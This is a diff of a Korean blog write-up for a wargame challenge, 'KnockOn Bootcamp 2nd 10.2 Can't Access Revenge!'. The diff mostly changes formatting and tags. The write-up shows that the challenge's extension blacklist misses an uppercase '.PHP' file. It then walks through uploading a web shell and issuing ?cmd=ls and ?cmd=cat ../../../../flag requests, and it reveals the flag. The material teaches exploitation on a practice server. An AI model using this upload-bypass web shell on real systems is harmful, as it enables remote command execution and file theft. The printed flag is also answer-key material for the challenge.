@@ -1,53 +1,33 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 10.2 Can't access revenge!"
+title: "KnockOn Bootcamp 2nd - 10.2 Can't Access Revenge! - .htaccess Bypass"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - File Upload
-  - Command Injection
-last_modified_at: 2024-09-15T21:30:00-05:00
+  - Filter Bypass
+  - Web Shell
+last_modified_at: 2024-09-16T11:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10019/>
 
-![10.2 Can't access revenge! 1](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_1.png)
+![10.2 Can't access revenge! 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-2-file-1.png)
 
-![10.2 Can't access revenge! 2](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_2.png)
-
-|
-
-|
-
-|
+![10.2 Can't access revenge! 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-2-file-2.png)
 
 ### 목표
 
----
-
 서버 파일에서 flag 찾기
-
-|
 
 ### 공격 기법
 
----
-
 File Upload
-
-Command Injection
-
-|
-
-|
-
-|
+- Filter Bypass
+- Web Shell
 
 ## 문제 코드
 
@@ -228,17 +208,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['title'] && $_POST['content']
 ?>
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### upload.php
-
----
 
 ```php
 $blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml","pht","pHp","pHp5","pHp4","pHp3","pHp2","pHp1","Html","Htm","pHtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","jSp","jSpx","jSpa","jSw","jSv","jSpf","jHtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","aSp","aSpx","aSa","aSax","aScx","aShx","aSmx","cEr","sWf","swf","htaccess");
@@ -246,21 +218,13 @@ $blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml"
 
 `htaccess`가 추가됨
 
-|
-
 ```php
 $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
 ```
 
 여전히 대문자 가능
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```php
 <?php
@@ -270,45 +234,31 @@ $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
 
 `*.PHP` (대문자) 파일 업로드
 
-|
-
 ```sh
 http://war.knock-on.org:10019/uploads/test2.PHP?cmd=ls
 ```
 
-![10.2 Can't access revenge! 3](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_2.png)
+![10.2 Can't access revenge! 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-2-file-2.png)
 
 커맨드 실행 가능
-
-|
 
 ```sh
 http://war.knock-on.org:10019/uploads/test2.PHP?cmd=ls%20../../../../
 ```
 
-![10.2 Can't access revenge! 4](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_3.png)
+![10.2 Can't access revenge! 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-2-file-3.png)
 
 flag 발견
-
-|
 
 ```sh
 http://war.knock-on.org:10019/uploads/test2.PHP?cmd=cat%20../../../../flag
 ```
 
-![10.2 Can't access revenge! 5](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_4.png)
+![10.2 Can't access revenge! 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-2-file-4.png)
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### test2.PHP
-
----
 
 ```php
 <?php
@@ -316,28 +266,14 @@ http://war.knock-on.org:10019/uploads/test2.PHP?cmd=cat%20../../../../flag
 ?>
 ```
 
-|
-
 ### URL
-
----
 
 ```sh
 http://war.knock-on.org:10019/uploads/test2.PHP?cmd=cat%20../../../../flag
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```sh
 K0{you_solve_this_with_higher_case?}
 ```
-
-|
-
----
